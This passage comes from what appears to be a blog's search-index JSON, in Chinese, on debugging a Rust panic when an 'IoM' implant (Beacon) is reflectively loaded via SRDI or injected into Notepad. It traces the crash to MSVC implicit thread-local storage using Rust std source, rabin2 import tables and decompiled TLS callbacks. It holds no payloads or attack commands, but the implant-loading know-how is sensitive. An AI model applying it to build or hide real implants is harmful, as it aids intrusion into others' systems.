\u4f46\u51e1\u4e8b\u603b\u6709\u4f8b\u5916</p>"},{"location":"blog/2025/01/07/IoM_advanced_TLS/#\u4ece\u4e00\u4e2apanic\u8bf4\u8d77","title":"\u4ece\u4e00\u4e2aPanic\u8bf4\u8d77","text":""},{"location":"blog/2025/01/07/IoM_advanced_TLS/#\u7b2c\u4e00\u6b21\u64e6\u80a9","title":"\u7b2c\u4e00\u6b21\u64e6\u80a9","text":"<p>\u5728\u521d\u671f\u6d4b\u8bd5\u4e2d\uff0c \u6211\u4eec\u52a8\u6001\u52a0\u8f7d <code>Modules(IOM\u7684\u7ec4\u4ef6)</code> \u8fd9\u4e00\u529f\u80fd\u5728\u5355\u5143\u6d4b\u8bd5\u4e2d\u8fd0\u884c\u7684\u5341\u5206\u826f\u597d\uff0c \u4f46\u968f\u7740\u529f\u80fd\u7684\u9010\u6e10\u589e\u591a\uff0c \u5728 <code>netstat module</code>  \u7684\u6d4b\u8bd5\u4e2d\uff0c <code>implant</code> \u7a81\u7136\u5d29\u6e83,  \u5f53\u65f6\u7684\u5d29\u6e83\u70b9\u4f4d\u4e8e <code>tokio</code> \uff08\u4e00\u4e2a<code>Rust</code>\u7684\u5f02\u6b65\u8fd0\u884c\u65f6\u5e93\uff09\u7684 <code>TLS</code> \u5904\u7406\u4ee3\u7801\u4e2d\uff0c \u968f\u540e\u6211\u7b80\u5355\u7ffb\u9605\u4e86\u4e0b <code>tokio</code> \u5e93\u7684 <code>issues</code>, \u53d1\u73b0\u6709\u4eba\u63d0\u53ca\u5728<code>windows</code> \u4e2d <code>tokio</code>\u7684 <code>TLS</code> \u5b9e\u73b0\u7565\u6709\u95ee\u9898\uff0c\u56e0\u6b64\u6211\u5c06\u8be5\u5e93\u66ff\u6362\u6210\u4e86<code>async-std</code>\u5e93\uff0c\u8fd9\u4e2a\u95ee\u9898\u5c31\u6d88\u5931\u4e86\uff0c \u7531\u4e8e\u5f53\u65f6\u6b63\u5904\u4e8e <code>implant</code> \u529f\u80fd\u7684\u5feb\u901f\u5f00\u53d1\u5468\u671f\uff0c \u56e0\u6b64\u5728\u5c06\u539f\u56e0\u7b80\u5355\u5f52\u7ed3\u4e8e <code>tokio</code> \u5e93\u672c\u8eab\u7684\u95ee\u9898\u540e\u5c06\u5176\u6682\u65f6\u6401\u7f6e\uff0c \u4e0e\u6838\u5fc3\u95ee\u9898\u64e6\u80a9\u800c\u8fc7</p>"},{"location":"blog/2025/01/07/IoM_advanced_TLS/#\u518d\u76f8\u9047","title":"\u518d\u76f8\u9047","text":"<p>\u518d\u6b21\u76f8\u9047\u5c31\u662f\u5b9e\u73b0 <code>SRDI</code> \u529f\u80fd\u4e86\uff0c \u4e0e\u7b2c\u4e00\u6b21\u64e6\u80a9\u6781\u4e3a\u7c7b\u4f3c\uff0c \u5728\u6b63\u5e38 <code>SRDI</code> \u6211\u4eec\u7684 <code>Beacon</code> \u540e\uff0c \u5c06\u5176\u6ce8\u5165\u5230 <code>Notepad</code> \u8fdb\u7a0b\u4e0a\u7ebf\u6d41\u7a0b\u5341\u5206\u4e1d\u6ed1</p> <p>\u4f46\u5728\u67d0\u4e00\u6b21\u6d4b\u8bd5\u65f6\u53d1\u73b0\uff0c \u5728\u5c06\u5176 <code>inline</code> \u6267\u884c\u5728\u6211\u4eec\u81ea\u8eab\u8fdb\u7a0b\u65f6\uff0c \u719f\u6089\u7684 <code>panic</code> \u518d\u6b21\u51fa\u73b0</p> <pre><code>thread '&lt;unnamed&gt;' panicked at library\\std\\src\\thread\\local.rs:260:26:\ncannot access a Thread Local Storage value during or after destruction: AccessError\n</code></pre> <p>\u6b64\u65f6\u6211\u610f\u8bc6\u5230\uff0c \u5f53\u521d <code>tokio</code> \u597d\u50cf\u88ab\u6211\u51a4\u6789\u4e86\uff0c\u6b7b\u5728\u4e86\u6211\u7684\u5927\u610f\u4e0e\u9ebb\u6728\u4e0d\u4ec1\u4e2d\uff0c \u597d\u5728\u6838\u5fc3\u529f\u80fd\u7684\u5f00\u53d1\u57fa\u672c\u7ed3\u675f\uff0c \u7ec8\u4e8e\u6709\u4e86\u7a7a\u4f59\u65f6\u95f4\u6765\u8ba9\u6211\u4eec\u770b\u770b\u5230\u5e95\u53d1\u751f\u4e86\u4ec0\u4e48\uff0c \u4e3a <code>tokio</code> \u4f38\u51a4</p> <p>\u7531\u4e8e\u539f\u7406\u7c7b\u4f3c\uff0c\u56e0\u6b64\u8fd9\u91cc\u7528 <code>SRDI</code> \u8fd8\u662f <code>InlinePE</code> \u533a\u522b\u4e0d\u5927</p> <p>\u9996\u5148\u6392\u9664\u5e93\u672c\u8eab\u7684\u95ee\u9898\uff0c \u6211\u7f16\u8bd1\u4e86\u4e00\u4e2a <code>DLL</code> \u683c\u5f0f\u7684<code>beacon</code>\uff0c \u901a\u8fc7\u7cfb\u7edf\u7684 <code>LoadLibrary</code> \u6765\u8fdb\u884c\u52a0\u8f7d\u5e76\u8c03\u7528\uff0c \u4e1d\u6ed1\u4e0a\u7ebf</p> <p>\u597d\u7684\uff0c \u8fd9\u91cc\u5c31\u53ef\u4ee5\u786e\u5b9a\u662f\u6211\u4eec <code>Load</code> \u7684\u65f6\u5019\u4e00\u5b9a\u5c11\u5904\u7406\u4e86\u54ea\u4e9b\u4e1c\u897f\uff0c \u4e00\u5b9a\u662f <code>TLS</code>\u7684\u95ee\u9898\u5417</p> <p>\u4e3a\u4e86\u7cbe\u786e\u5230 <code>TLS</code> \uff0c \u968f\u540e\u6211\u5c1d\u8bd5\u4f7f\u7528 <code>GNU</code> \u7f16\u8bd1\u94fe\u6765\u8fdb\u884c\u6d4b\u8bd5\u3002 \u7f16\u8bd1\uff0c <code>inline</code> \u6267\u884c\uff0c \u5b8c\u7f8e\u4e0a\u7ebf\uff0c \u5207\u56de <code>MSVC</code>\uff0c <code>panic</code></p> <p>\u597d\u7684\uff0c \u81f3\u6b64\uff0c \u6211\u4eec\u5c06\u8303\u56f4\u6536\u7f29\u5230\u4e86 <code>TLS</code>\u672c\u8eab\u5904\u7406\u4e0a\uff0c \u8ba9\u6211\u4eec\u8ffd\u6839\u6eaf\u6e90</p>"},{"location":"blog/2025/01/07/IoM_advanced_TLS/#\u56de\u5f52tls","title":"\u56de\u5f52TLS","text":"<p>\u5982\u679c\u4ece\u5934\u8bb2\u8d77\uff0c \u672c\u7bc7\u6587\u7ae0\u7684\u7bc7\u5e45\u5c06\u8fc7\u4e8e\u53d1\u6563\u4e14\u5e9e\u5927\uff0c \u56e0\u6b64\u73b0\u5728\u5c06\u6211\u4eec\u7684\u76ee\u5149\u6536\u675f\u5728<code>TLS</code> \u672c\u8eab\u4e0a\uff0c \u5f53\u7136\uff0c \u8fd9\u91cc\u6211\u4e5f\u4f1a\u7b80\u8981\u5bf9\u5176\u505a\u4e00\u4e2a\u4ecb\u7ecd\uff0c \u76f8\u4fe1\u611f\u5174\u8da3\u7684\u540c\u5b66\u4f1a\u81ea\u5df1\u627e\u5230\u67d0\u4e9b\u6d41\u4f20\u7684\u7b2c\u4e09\u65b9\u6587\u6863\u7684\uff0c \u4e3a\u907f\u514d\u6982\u5ff5\u6027\u7684\u5185\u5bb9\u5927\u91cf\u5360\u7528\u672c\u6587\u7bc7\u5e45\uff0c\u63a8\u8350\u5404\u4f4d\u76f4\u63a5\u9605\u8bfb Ken Johnson \u5173\u4e8e <code>TLS</code> \u7684\u7cbe\u5f69\u5206\u6790</p> <p>\u7b80\u5355\u6765\u8bf4\uff0c <code>TLS</code>  \u53ef\u4ee5\u5141\u8bb8\u4eba\u4eec\u6309\u7ebf\u7a0b\u8fdb\u884c\u5b58\u50a8\uff0c \u6bd4\u5982\u5728\u5168\u5c40\u53d8\u91cf\u6309\u7ebf\u7a0b\u5b9e\u4f8b\u5316\u65f6, \u800c\u5728 <code>windows</code> \u4e2d\uff0c \u6709\u4e00\u4e2a\u7ebf\u7a0b\u76f8\u5173\u7684\u7ed3\u6784\u4f53 <code>TEB\uff08Thread Environment Block)</code>\uff0c \u8be5\u7ed3\u6784\u4f53\u4f1a\u8bb0\u5f55\u548c\u63a7\u5236\u5f88\u591a\u7ebf\u7a0b\u76f8\u5173\u7684\u4e0a\u4e0b\u6587\uff0c \u6211\u4eec\u672c\u7bc7\u7684\u91cd\u70b9\u4e5f\u81ea\u7136\u8bb0\u5f55\u4e8e\u6b64</p> <p>\u5728 <code>windows</code> \u4e2d\uff0c \u6709\u4e24\u79cd\u4f7f\u7528 <code>TLS</code> \u7684\u65b9\u5f0f\uff0c \u663e\u5f0f\u8c03\u7528\u548c\u9690\u5f0f\uff0c \u663e\u5f0f\u8c03\u7528\u5373\u5927\u5bb6\u719f\u6089\u7684\u4f7f\u7528 <code>TlsGetValue</code> \u7b49 <code>k32</code> \u7684 <code>apis</code>, \u800c\u9690\u5f0f\u8c03\u7528\u5373\u662f\u672c\u7bc7\u7684\u91cd\u70b9\u5de5\u7a0b\uff0c \u5373\u5728\u4f7f\u7528<code>MSVC</code>\uff08\u8fd9\u4e5f\u662f\u4e3a\u4ec0\u4e48\u4e0a\u4e00\u7ae0\u6211\u9009\u7528GNU\u6765\u7b80\u5355\u805a\u7126\u7684\u539f\u56e0\uff09\u6784\u5efa\u65f6\uff0c \u7528<code>_declspec(thread)</code>\u6765\u6807\u8bb0\u53d8\u91cf</p> <p>\u73b0\u5728\u8ba9\u6211\u4eec\u4ee5 <code>rust</code> \u7684\u7ebf\u7a0b\u4ee3\u7801\u4e3a\u4f8b(<code>rustc version &gt;= 1.82.0</code>)</p> <p>\u4e3a\u4e86\u6536\u675f\u7bc7\u5e45\uff0c \u4e0b\u9762\u5c06\u4ee564\u4f4dwindows\u7cfb\u7edf\u4e3a\u4f8b\uff0c \u5e76\u5ffd\u7565\u5927\u90e8\u5206\u4e0d\u5fc5\u5173\u6ce8\u7684\u4ee3\u7801</p> <pre><code>// https://github.com/rust-lang/rust/blob/f2b91ccbc27cb06369aa2dd934ff219e156408a8/library/std/src/thread/current.rs\nuse crate::sys::thread_local::local_pointer;\n\n...\n\nlocal_pointer! {\n    static CURRENT;\n}\n\n...\n// \u4e3a\u7b80\u5316\u4ee3\u7801\uff0c \u8fd9\u91cc\u6211\u4eec\u7701\u7565\u6389\u5927\u90e8\u5206\u76ee\u6807\u7cfb\u7edf(16, 32\u4f4d)\nlocal_pointer! {\n    static ID;\n}\n</code></pre> <p>\u800c\u8fdb\u5165 <code>windows</code> \u7684 <code>thread_local</code> \u4e2d\uff0c \u6211\u4eec\u53ef\u4ee5\u770b\u5230\uff0c </p> <pre><code>// \n#[macro_export]\n#[stable(feature = \"rust1\", since = \"1.0.0\")]\n#[cfg_attr(not(test), rustc_diagnostic_item = \"thread_local_macro\")]\n#[allow_internal_unstable(thread_local_internals)]\nmacro_rules! thread_local {\n    ....\n\n    // handle a single declaration\n    ($(#[$attr:meta])* $vis:vis static $name:ident: $t:ty = $init:expr) =&gt; (\n        $crate::thread::local_impl::thread_local_inner!($(#[$attr])* $vis $name, $t, $init);\n    );\n}\n</code></pre> <p>\u5373</p> <pre><code>// https://github.com/rust-lang/rust/blob/f2b91ccbc27cb06369aa2dd934ff219e156408a8/library/std/src/sys/thread_local/os.rs#L16\npub macro thread_local_inner {\n    // used to generate the `LocalKey` value for const-initialized thread locals\n    (@key $t:ty, const $init:expr) =&gt; {\n        $crate::thread::local_impl::thread_local_inner!(@key $t, { const INIT_EXPR: $t = $init; INIT_EXPR })\n    },\n\n    // NOTE: we cannot import `Storage` or `LocalKey` with a `use` because that can shadow user\n    // provided type or type alias with a matching name. Please update the shadowing test in\n    // `tests/thread.rs` if these types are renamed.\n\n    // used to generate the `LocalKey` value for `thread_local!`.\n    (@key $t:ty, $init:expr) =&gt; {{\n        #[inline]\n        fn __init() -&gt; $t { $init }\n\n        // NOTE: this cannot import `LocalKey` or `Storage` with a `use` because that can shadow\n        // user provided type or type alias with a matching name. Please update the shadowing test\n        // in `tests/thread.rs` if these types are renamed.\n        unsafe {\n            // Inlining does not work on windows-gnu due to linking errors around\n            // dllimports. See https://github.com/rust-lang/rust/issues/109797.\n            $crate::thread::LocalKey::new(#[cfg_attr(windows, inline(never))] |init| {\n                static VAL: $crate::thread::local_impl::Storage&lt;$t&gt;\n                    = $crate::thread::local_impl::Storage::new();\n                VAL.get(init, __init)\n            })\n        }\n    }},\n    ($(#[$attr:meta])* $vis:vis $name:ident, $t:ty, $($init:tt)*) =&gt; {\n        $(#[$attr])* $vis const $name: $crate::thread::LocalKey&lt;$t&gt; =\n            $crate::thread::local_impl::thread_local_inner!(@key $t, $($init)*);\n    },\n}\n</code></pre> <p>\u4e5f\u5c31\u662f</p> <pre><code>#[allow(missing_debug_implementations)]\npub struct Storage&lt;T&gt; {\n    key: LazyKey,\n    marker: PhantomData&lt;Cell&lt;T&gt;&gt;,\n}\n\nunsafe impl&lt;T&gt; Sync for Storage&lt;T&gt; {}\n\nstruct Value&lt;T: 'static&gt; {\n    value: T,\n    // INVARIANT: if this value is stored under a TLS key, `key` must be that `key`.\n    key: Key,\n}\n\nimpl&lt;T: 'static&gt; Storage&lt;T&gt; {\n    pub const fn new() -&gt; Storage&lt;T&gt; {\n        Storage { key: LazyKey::new(Some(destroy_value::&lt;T&gt;)), marker: PhantomData }\n    }\n    ...\n</code></pre> <p>\u805a\u7126\u5230 <code>windows</code> \u4e2d\uff0c \u5c31\u662f\u5982\u4e0b\u7684\u4ee3\u7801\u4e86</p> <pre><code>// https://github.com/rust-lang/rust/blob/f2b91ccbc27cb06369aa2dd934ff219e156408a8/library/std/src/sys/thread_local/key/windows.rs\npub struct LazyKey {\n    /// The key value shifted up by one. Since TLS_OUT_OF_INDEXES == u32::MAX\n    /// is not a valid key value, this allows us to use zero as sentinel value\n    /// without risking overflow.\n    key: AtomicU32,\n    dtor: Option&lt;Dtor&gt;,\n    next: AtomicPtr&lt;LazyKey&gt;,\n    /// Currently, destructors cannot be unregistered, so we cannot use racy\n    /// initialization for keys. Instead, we need synchronize initialization.\n    /// Use the Windows-provided `Once` since it does not require TLS.\n    once: UnsafeCell&lt;c::INIT_ONCE&gt;,\n}\n\n\nimpl LazyKey {\n    #[inline]\n    pub const fn new(dtor: Option&lt;Dtor&gt;) -&gt; LazyKey {\n        LazyKey {\n            key: AtomicU32::new(0),\n            dtor,\n            next: AtomicPtr::new(ptr::null_mut()),\n            once: UnsafeCell::new(c::INIT_ONCE_STATIC_INIT),\n        }\n    }\n    ...\n\n    #[cold]\n    unsafe fn init(&amp;'static self) -&gt; Key {\n        if self.dtor.is_some() {\n            let mut pending = c::FALSE;\n            ...\n\n            if pending == c::FALSE {\n                // Some other thread initialized the key, load it.\n                self.key.load(Relaxed) - 1\n            } else {\n                let key = unsafe { c::TlsAlloc() };\n                ...\n\n                key\n            }\n        } else {\n            // If there is no destructor to clean up, we can use racy initialization.\n\n            let key = unsafe { c::TlsAlloc() };\n            ...\n        }\n    }\n}\n</code></pre> <p>\u867d\u7136\u6211\u4eec\u5728 <code>init</code>\u51fd\u6570\u4e2d\u770b\u5230\u4e86\u719f\u6089\u7684 <code>TlsAlloc</code>\uff0c <code>TlsFree</code>\uff0c \u4f46\u7531\u4e8e\u88ab\u6ce8\u518c\u4e3a\u4e86 <code>#[cold]</code> \u51fd\u6570\uff0c \u56e0\u6b64\u6211\u4eec\u5927\u90e8\u5206\u60c5\u51b5\u4e0b\u90fd\u8be5\u5ffd\u89c6\u8be5\u5b9e\u73b0\uff0c \u53ea\u9700\u8981\u5173\u6ce8 <code>new</code> \u51fd\u6570\u5373\u53ef</p> <p>\u90a3\u4e48 <code>key</code> \u5c31\u662f\u901a\u8fc7\u539f\u5b50\u64cd\u4f5c\u8fdb\u884c\u5b9a\u4e49\u7684 <code>AtomicU32::new()</code></p> <p>\u9664\u6b64\u4e4b\u5916\uff0c \u4e3a\u4e86\u89e3\u51b3<code>tls</code>\u7684\u6790\u6784\u51fd\u6570\u95ee\u9898\uff0c <code>rust</code> \u6ce8\u518c\u4e86\u4e00\u4e2a <code>tls callback</code></p> <pre><code>// https://github.com/rust-lang/rust/blob/master/library/std/src/sys/thread_local/guard/windows.rs\n#[link_section = \".CRT$XLB\"]\n#[cfg_attr(miri, used)] // Miri only considers explicitly `#[used]` statics for `lookup_link_section`\npub static CALLBACK: unsafe extern \"system\" fn(*mut c_void, u32, *mut c_void) = tls_callback;\n\nunsafe extern \"system\" fn tls_callback(_h: *mut c_void, dw_reason: u32, _pv: *mut c_void) {\n    if dw_reason == c::DLL_THREAD_DETACH || dw_reason == c::DLL_PROCESS_DETACH {\n        unsafe {\n            #[cfg(target_thread_local)]\n            super::super::destructors::run();\n            #[cfg(not(target_thread_local))]\n            super::super::key::run_dtors();\n\n            crate::rt::thread_cleanup();\n        }\n    }\n}\n</code></pre> <p>\u8fd9\u4e5f\u53ef\u4ee5\u89e3\u91ca\u4e3a\u4ec0\u4e48\u7b80\u5355\u7684 <code>hello world</code> \u51fd\u6570\u4e5f\u4f1a\u542b\u6709\u4e00\u4e2a <code>tls_callback</code> \u51fd\u6570\u4e86</p> <p>\u5728\u4f7f\u7528<code>target_thread_local</code>\u65f6\uff0c \u5176\u6790\u6784\u51fd\u6570\u4e3a</p> <pre><code>pub unsafe fn run() {\n    loop {\n        let mut dtors = DTORS.borrow_mut();\n        match dtors.pop() {\n            Some((t, dtor)) =&gt; {\n                drop(dtors);\n                unsafe {\n                    dtor(t);\n                }\n            }\n            None =&gt; {\n                // Free the list memory.\n                *dtors = Vec::new();\n                break;\n            }\n        }\n    }\n}\n</code></pre> <p>\u800c\u5728\u4e0d\u4f7f\u7528 <code>target_thread_local</code> \u65f6\uff0c \u5176\u6790\u6784\u51fd\u6570\u4e3a</p> <pre><code>// This will and must only be run by the destructor callback in [`guard`].\npub unsafe fn run_dtors() {\n    for _ in 0..5 {\n        let mut any_run = false;\n\n        // Use acquire ordering to observe key initialization.\n        let mut cur = DTORS.load(Acquire);\n        while !cur.is_null() {\n            let pre_key = unsafe { (*cur).key.load(Acquire) };\n            let dtor = unsafe { (*cur).dtor.unwrap() };\n            cur = unsafe { (*cur).next.load(Relaxed) };\n\n            // In LazyKey::init, we register the dtor before setting `key`.\n            // So if one thread's `run_dtors` races with another thread executing `init` on the same\n            // `LazyKey`, we can encounter a key of 0 here. That means this key was never\n            // initialized in this thread so we can safely skip it.\n            if pre_key == 0 {\n                continue;\n            }\n            // If this is non-zero, then via the `Acquire` load above we synchronized with\n            // everything relevant for this key. (It's not clear that this is needed, since the\n            // release-acquire pair on DTORS also establishes synchronization, but better safe than\n            // sorry.)\n            let key = pre_key - 1;\n\n            let ptr = unsafe { c::TlsGetValue(key) };\n            if !ptr.is_null() {\n                unsafe {\n                    c::TlsSetValue(key, ptr::null_mut());\n                    dtor(ptr as *mut _);\n                    any_run = true;\n                }\n            }\n        }\n\n        if !any_run {\n            break;\n        }\n    }\n}\n</code></pre> <p>\u4e5f\u5c31\u662f\u8bf4\uff0c \u5982\u679c\u4e0d\u4f7f\u7528 <code>target_thread_local</code>, \u6211\u4eec\u4f9d\u65e7\u662f\u4f7f\u7528 <code>Tls*</code> \u7cfb\u5217\u51fd\u6570\u8fdb\u884c\u7ba1\u7406</p> <p>\u770b\u5230\u8fd9\u91cc\uff0c \u5e94\u8be5\u5df2\u7ecf\u53ef\u4ee5\u6682\u65f6\u5c06\u6240\u8c13\u7684 <code>target_thread_local</code> \u548c\u9690\u5f0f\u8c03\u7528\u6302\u7b49\u53f7\u4e86</p> <p>\u7531\u4e8e\u5355\u7eaf\u7684\u4ee3\u7801\u5e76\u4e0d\u80fd\u5b8c\u6574\u7684\u6784\u6210<code>TLS</code>\u7684\u6784\u9020\uff0c \u5176\u5e94\u8be5\u662f\u4ee3\u7801\uff0c \u7f16\u8bd1\u5668\u548c\u64cd\u4f5c\u7cfb\u7edf\u5171\u540c\u52aa\u529b\u7684\u7ed3\u679c\uff0c \u56e0\u6b64\u63a5\u4e0b\u6765\u6211\u4eec\u9700\u8981\u770b\u770b\u7f16\u8bd1\u540e\u7684\u7ed3\u679c</p>"},{"location":"blog/2025/01/07/IoM_advanced_TLS/#hello-world","title":"hello world \uff1a\uff09","text":"<p>\u9996\u5148\u8ba9\u6211\u4eec\u7528 <code>msvc</code> \u7f16\u8bd1\u4e00\u4e2a\u7b80\u5355\u7684<code>hello world</code> \u793a\u4f8b</p> <pre><code>cargo new hello_world\n\ncd hello_world\n\ncargo build --target x86_64-pc-windows-msvc\n</code></pre> <p>\u9996\u5148\u662f\u5bfc\u5165\u8868, \u975e\u5e38\u5e72\u51c0\uff0c \u6ca1\u6709 <code>Tls</code> \u76f8\u5173\u51fd\u6570</p> <pre><code>&gt; rabin2 -i .\\hello_world.exe\n[Imports]\nnth vaddr       bind type lib                               name\n----------------------------------------------------------------\n1   0x14001b000 NONE FUNC KERNEL32.dll                      GetLastError\n2   0x14001b008 NONE FUNC KERNEL32.dll                      AddVectoredExceptionHandler\n3   0x14001b010 NONE FUNC KERNEL32.dll                      SetThreadStackGuarantee\n4   0x14001b018 NONE FUNC KERNEL32.dll                      WaitForSingleObject\n5   0x14001b020 NONE FUNC KERNEL32.dll                      QueryPerformanceCounter\n6   0x14001b028 NONE FUNC KERNEL32.dll                      AcquireSRWLockExclusive\n7   0x14001b030 NONE FUNC KERNEL32.dll                      RtlCaptureContext\n8   0x14001b038 NONE FUNC KERNEL32.dll                      RtlVirtualUnwind\n9   0x14001b040 NONE FUNC KERNEL32.dll                      RtlLookupFunctionEntry\n10  0x14001b048 NONE FUNC KERNEL32.dll                      SetLastError\n11  0x14001b050 NONE FUNC KERNEL32.dll                      GetCurrentDirectoryW\n12  0x14001b058 NONE FUNC KERNEL32.dll                      GetEnvironmentVariableW\n13  0x14001b060 NONE FUNC KERNEL32.dll                      GetCurrentProcess\n14  0x14001b068 NONE FUNC KERNEL32.dll                      GetStdHandle\n15  0x14001b070 NONE FUNC KERNEL32.dll                      GetCurrentProcessId\n16  0x14001b078 NONE FUNC KERNEL32.dll                      TryAcquireSRWLockExclusive\n17  0x14001b080 NONE FUNC KERNEL32.dll                      HeapAlloc\n18  0x14001b088 NONE FUNC KERNEL32.dll                      GetProcessHeap\n19  0x14001b090 NONE FUNC KERNEL32.dll                      HeapFree\n20  0x14001b098 NONE FUNC KERNEL32.dll                      HeapReAlloc\n21  0x14001b0a0 NONE FUNC KERNEL32.dll                      AcquireSRWLockShared\n22  0x14001b0a8 NONE FUNC KERNEL32.dll                      ReleaseSRWLockShared\n23  0x14001b0b0 NONE FUNC KERNEL32.dll                      ReleaseMutex\n24  0x14001b0b8 NONE FUNC KERNEL32.dll                      GetModuleHandleA\n25  0x14001b0c0 NONE FUNC KERNEL32.dll                      GetConsoleMode\n26  0x14001b0c8 NONE FUNC KERNEL32.dll                      GetModuleHandleW\n27  0x14001b0d0 NONE FUNC KERNEL32.dll                      FormatMessageW\n28  0x14001b0d8 NONE FUNC KERNEL32.dll                      MultiByteToWideChar\n29  0x14001b0e0 NONE FUNC KERNEL32.dll                      WriteConsoleW\n30  0x14001b0e8 NONE FUNC KERNEL32.dll                      GetCurrentThread\n31  0x14001b0f0 NONE FUNC KERNEL32.dll                      GetSystemTimeAsFileTime\n32  0x14001b0f8 NONE FUNC KERNEL32.dll                      WaitForSingleObjectEx\n33  0x14001b100 NONE FUNC KERNEL32.dll                      LoadLibraryA\n34  0x14001b108 NONE FUNC KERNEL32.dll                      CreateMutexA\n35  0x14001b110 NONE FUNC KERNEL32.dll                      ReleaseSRWLockExclusive\n36  0x14001b118 NONE FUNC KERNEL32.dll                      GetProcAddress\n37  0x14001b120 NONE FUNC KERNEL32.dll                      CloseHandle\n38  0x14001b128 NONE FUNC KERNEL32.dll                      SetUnhandledExceptionFilter\n39  0x14001b130 NONE FUNC KERNEL32.dll                      UnhandledExceptionFilter\n40  0x14001b138 NONE FUNC KERNEL32.dll                      IsDebuggerPresent\n41  0x14001b140 NONE FUNC KERNEL32.dll                      InitializeSListHead\n42  0x14001b148 NONE FUNC KERNEL32.dll                      GetCurrentThreadId\n43  0x14001b150 NONE FUNC KERNEL32.dll                      IsProcessorFeaturePresent\n...\n</code></pre> <p>\u968f\u540e\u662f\u5bfc\u51fa\u8868</p> <pre><code>Name    Address Ordinal\nTlsCallback_0   000000014000AF60    \nmainCRTStartup  0000000140018AA0    [main entry]\n</code></pre> <pre><code>__int64 __fastcall std::sys::windows::thread_local_key::on_tls_callback(__int64 a1, int a2)\n{\n  __int64 result; // rax\n\n  result = (unsigned __int8)byte_140025258;\n  if ( byte_140025258 )\n  {\n    if ( !a2 || a2 == 3 )\n    {\n      try\n      {\n        std::sys::windows::thread_local_key::run_keyless_dtors();\n      }\n      catch ( ... )\n      {\n        core::panicking::panic_cannot_unwind();\n      }\n    }\n    return LOBYTE(tls_used.StartAddressOfRawData);\n  }\n  return result;\n}\n</code></pre> <p>\u7b26\u5408\u4e4b\u524d\u7684\u731c\u60f3\uff0c \u800c\u5982\u679c\u6b64\u65f6\u67e5\u770b\u6240\u6709 <code>tls_index</code> \u7684\u5f15\u7528\uff0c \u90a3\u4e48\u53ef\u4ee5\u53d1\u73b0\u8db3\u8db3\u6709 <code>45</code> \u5904\u5f15\u7528</p> <p>\u800c\u6b64\u65f6\u5982\u679c\u6211\u4eec\u7f16\u8bd1\u4e00\u4e2a <code>gnu</code> \u7248\u672c <code>hello world</code></p> <pre><code>cargo build --target x86_64-pc-windows-gnu\n</code></pre> <p>\u9996\u5148\u770b <code>Import</code> \u8868\uff0c \u6709\u51e0\u4e2a\u6709\u610f\u601d\u7684\u51fd\u6570\u51fa\u73b0\u4e86 <code>Tls*</code></p> <pre><code> rabin2 -i .\\hello_world.exe\n[Imports]\nnth vaddr       bind type lib          name\n-------------------------------------------\n...\n105 0x140101a00 NONE FUNC KERNEL32.dll TlsAlloc\n106 0x140101a08 NONE FUNC KERNEL32.dll TlsFree\n107 0x140101a10 NONE FUNC KERNEL32.dll TlsGetValue\n108 0x140101a18 NONE FUNC KERNEL32.dll TlsSetValue\n...\n</code></pre> <p>\u518d\u770b\u770b\u5bfc\u51fa\u8868</p> <pre><code>Name    Address Ordinal\nTlsCallback_0   0000000140051DF0    \nTlsCallback_1   00000001400BD500    \nTlsCallback_2   00000001400BD4D0    \nmainCRTStartup  00000001400014F0    [main entry]\n</code></pre> <p>\u597d\u7684\uff0c \u51fa\u73b0\u4e86\u4e09\u4e2a <code>tls callback</code> \u51fd\u6570, \u9996\u5148\u662f <code>callback_0</code></p> <pre><code>void __cdecl std::sys::windows::thread_local_key::on_tls_callback()\n{\n    ...\n  if ( std::sys::windows::thread_local_key::HAS_DTORS &amp;&amp; (!v0 || v0 == 3) )\n  {\n    v1 = std::sys::windows::thread_local_key::DTORS;\n    if ( std::sys::windows::thread_local_key::DTORS )\n    {\n      v2 = 0;\n      do\n      {\n        v3 = *(void (__fastcall **)(LPVOID))v1;\n        if ( !*(_QWORD *)v1 )\nLABEL_39:\n          core::panicking::panic();\n        v4 = *(_DWORD *)(v1 + 24) - 1;\n        Value = TlsGetValue(v4);\n        if ( Value )\n        {\n          v6 = Value;\n          TlsSetValue(v4, 0LL);\n          v3(v6);\n          v2 = 1;\n        }\n        v1 = *(_QWORD *)(v1 + 8);\n      }\n     ...\n</code></pre> <p>\u4f9d\u65e7\u662f<code>tls</code> \u7684\u6790\u6784\u51fd\u6570\uff0c \u4f46\u8fd9\u91cc\u6709\u4e86<code>TlsGetValue</code>\u548c <code>TlsSetValue</code> \u51fd\u6570, \u4e5f\u5c31\u662f\u975e<code>target_thread_local</code> \u4e0b\uff0c \u53e6\u5916\u4e24\u4e2a\u5462</p> <p><code>callback1</code> \u662f </p> <pre><code>BOOL __fastcall _dyn_tls_init(HANDLE hDllHandle, DWORD dwReason, LPVOID lpreserved)\n{\n  if ( *refptr__CRT_MT != 2 )\n    *refptr__CRT_MT = 2;\n  if ( dwReason == 1 )\n    _mingw_TLScallback(hDllHandle, 1u, lpreserved);\n  return 1;\n}\n</code></pre> <p><code>callback2</code>\u662f</p> <pre><code>BOOL __fastcall _dyn_tls_dtor(HANDLE hDllHandle, DWORD dwReason, LPVOID lpreserved)\n{\n  if ( dwReason != 3 &amp;&amp; dwReason )\n    return 1;\n  _mingw_TLScallback(hDllHandle, dwReason, lpreserved);\n  return 1;\n}\n</code></pre> <p>\u597d\u7684\uff0c \u90fd\u662f <code>mingw</code> \u5b9a\u4e49\u7684\uff0c \u6211\u4eec\u518d\u5728\u8fd9\u91cc\u67e5\u770b\u4e00\u6b21 <code>tls_index</code> \u7684\u8c03\u7528\uff0c 0!!!!</p> <p>\u5230\u8fd9\u91cc\u51e0\u4e4e\u53ef\u4ee5\u786e\u5b9a\uff0c \u6211\u4eec\u5728\u52a0\u8f7d\u65f6\u51fa\u73b0\u7684\u4e00\u5207\u95ee\u9898\u90fd\u662f <code>msvc</code> \u4f7f\u7528\u9690\u5f0f<code>TLS</code>\u6240\u5bfc\u81f4\u7684\u95ee\u9898</p> <p>\u63a5\u4e0b\u6765\u8ba9\u6211\u4eec\u518d\u8fdb\u4e00\u6b65\uff0c \u7531\u4e8e\u8fd9\u91cc\u6211\u4eec\u4e0d\u518d\u5173\u6ce8\u663e\u793a\u8c03\u7528\uff0c \u56e0\u6b64\u663e\u793a\u8c03\u7528\u76f8\u5173\u7684\u5185\u5bb9\u53ef\u80fd\u5728\u672c\u7bc7\u6587\u7ae0\u7684\u540e\u7eed\u5185\u5bb9\u4e2d\u4e0d\u4f1a\u8fc7\u591a\u51fa\u73b0\u4e86:)</p> <p>\u90a3\u4e48\u6b64\u65f6\u6211\u4eec\u5982\u679c\u5c1d\u8bd5\u52a0\u8f7d 